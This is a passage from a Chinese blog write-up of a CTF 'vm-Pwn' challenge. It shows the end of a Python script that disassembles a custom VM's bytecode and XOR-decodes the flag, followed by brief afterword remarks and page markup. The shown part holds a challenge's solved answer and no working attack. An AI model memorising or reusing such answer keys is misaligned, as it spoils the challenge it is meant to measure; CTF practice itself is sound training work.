class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getop</span><span class="params">(i)</span>:</span></span><br><span class="line">  opc = <span class="string">''</span></span><br><span class="line">  opc += op[str(opcodes[i])]</span><br><span class="line">  oprand1=opcodes[i+<span class="number">2</span>]+opcodes[i+<span class="number">3</span>]*<span class="number">0x100</span></span><br><span class="line">  <span class="keyword">if</span>(oprand1&amp;<span class="number">0x8000</span>):</span><br><span class="line">    opc += str(oprand1<span class="number">-0x10000</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    opc += str(oprand1)</span><br><span class="line">  opc += <span class="string">' '</span></span><br><span class="line">  opc += str(opcodes[i+<span class="number">4</span>]+opcodes[i+<span class="number">5</span>]*<span class="number">0x100</span>)</span><br><span class="line">  <span class="keyword">return</span> opc</span><br><span class="line"></span><br><span class="line">opcodes_translate=map(getop,range(<span class="number">0</span>,len(opcodes),<span class="number">6</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">0</span>,len(opcodes_translate)):</span><br><span class="line">  print(i,opcodes_translate[i])</span><br><span class="line">cc=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">  c=data1[i*<span class="number">2</span>]^((i+<span class="number">36</span>)*<span class="number">2</span>)</span><br><span class="line">  cc.append(c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#xor</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">19</span>,<span class="number">3</span>,<span class="number">-1</span>):</span><br><span class="line">  cc[i]=cc[i<span class="number">-4</span>]^cc[i]</span><br><span class="line"></span><br><span class="line">print(<span class="string">''</span>.join([chr(item) <span class="keyword">for</span> item <span class="keyword">in</span> cc]))</span><br><span class="line"><span class="comment">#flag&#123;Y0u_ar3_S0co0L&#125;</span></span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://xz.aliyun.com/t/3608" target="_blank" rel="noopener">https://xz.aliyun.com/t/3608</a></p>
<h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>这道题第一次做是听奈沙夜影大佬的课讲的例题，大佬讲得真的好，但去年我根本听不懂。刚刚跑去找大佬博客，我的天连续打卡两年，真的是榜样一般的存在。</p>
<p><a href="https://blog.csdn.net/whklhhhh/article/list/3" target="_blank" rel="noopener">https://blog.csdn.net/whklhhhh/article/list/3</a></p>
<h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><p>python3的新特性是bytes和str分家了，一开始好不习惯，用着用着感觉还蛮香的，比2清晰。</p>
</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2020-01-29</span><i class="fa fa-tag"></i><a class="tag" href="/tags/PWN/" title="PWN">PWN </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" href="http://twitter.com/home?status=,http://q1iq.top/vm-Pwn/,Q1IQ,vm-Pwn,;" target="_blank" rel="noopener"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/kernel%E5%85%A5%E9%97%A8/" title="kernel入门">Post Anterior</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/%E5%AE%89%E6%B4%B5%E6%9D%AF-WP/" title="安洵杯 MIPS">Próximo post</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":true,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":200,"height":400,"hOffset":400,"vOffset":0},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body></html>